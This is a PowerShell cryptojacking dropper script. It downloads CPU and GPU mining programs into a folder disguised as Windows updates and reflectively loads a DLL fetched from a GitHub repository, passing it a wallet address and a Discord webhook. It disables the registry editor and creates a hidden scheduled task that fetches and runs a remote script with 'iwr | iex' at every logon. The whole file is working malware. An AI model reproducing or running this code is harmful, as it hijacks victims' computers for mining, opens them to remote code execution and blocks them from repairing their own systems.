# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "ultaV2"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$AmdMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Win64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
$Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"

# --- STEALTH SETUP ---
Write-Host "Running..."
$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
}

$CpuZip = Join-Path $StealthDir "update_c.zip"
$GpuZip = Join-Path $StealthDir "update_g.zip"
$CpuExe = Join-Path $StealthDir "win_sys_x.exe"
$GpuExe = Join-Path $StealthDir "win_sys_g.exe"

$wc = New-Object System.Net.WebClient

# 1. Handle CPU Miner
if (-not (Test-Path $CpuExe)) {
    try {
        $wc.DownloadFile($MinerUrl, $CpuZip)
        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force -ErrorAction SilentlyContinue
        Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
    } catch { }
}

# 2. Detect GPUs
$NvidiaGpu = $null
$AmdGpu = $null
try {
    $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($vc in $vcs) {
        if ($vc.Name -match "NVIDIA" -or $vc.PNPDeviceID -match "VEN_10DE") { $NvidiaGpu = $true }
        if ($vc.Name -match "AMD" -or $vc.Name -match "Radeon" -or $vc.PNPDeviceID -match "VEN_1002") { $AmdGpu = $true }
    }
} catch { }

if (($NvidiaGpu -or $AmdGpu) -and -not (Test-Path $GpuExe)) {
    try {
        $TargetUrl = if ($NvidiaGpu) { $GpuMinerUrl } else { $AmdMinerUrl }
        $wc.DownloadFile($TargetUrl, $GpuZip)
        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force -ErrorAction SilentlyContinue
        Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
        $Filter = if ($NvidiaGpu) { "miner.exe" } else { "lolMiner.exe" }
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter $Filter -Recurse | Select-Object -First 1
        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
    } catch { }
}

# --- REFLECTIVE LOADING ---
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
    $startMethod = $loader.GetMethod("StartMiner")

    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { [string]$GpuExe } else { "" }
    $IsAmd = if ($AmdGpu) { "true" } else { "false" }
    
    # Cast arguments explicitly to [string] to avoid PSObject conversion errors
    $argsArray = [string[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet, [string]$IsAmd, [string]$Webhook)
    $startMethod.Invoke($null, @(,$argsArray))
} catch {
    Write-Host "Initialization failed: $($_.Exception.Message)"
    if ($_.Exception.InnerException) { Write-Host "Inner: $($_.Exception.InnerException.Message)" }
}

# --- PERSISTENCE ---
try {
    $RegPolicyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    if (-not (Test-Path $RegPolicyPath)) { New-Item -Path $RegPolicyPath -Force | Out-Null }
    Set-ItemProperty -Path $RegPolicyPath -Name "DisableRegistryTools" -Value 1 -Type DWord

    $TaskName = "WinSysMaintenance"
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1 | iex`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $Trigger.RepetitionInterval = (New-TimeSpan -Hours 12)
    $Trigger.RepetitionDuration = [TimeSpan]::MaxValue
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
} catch { }
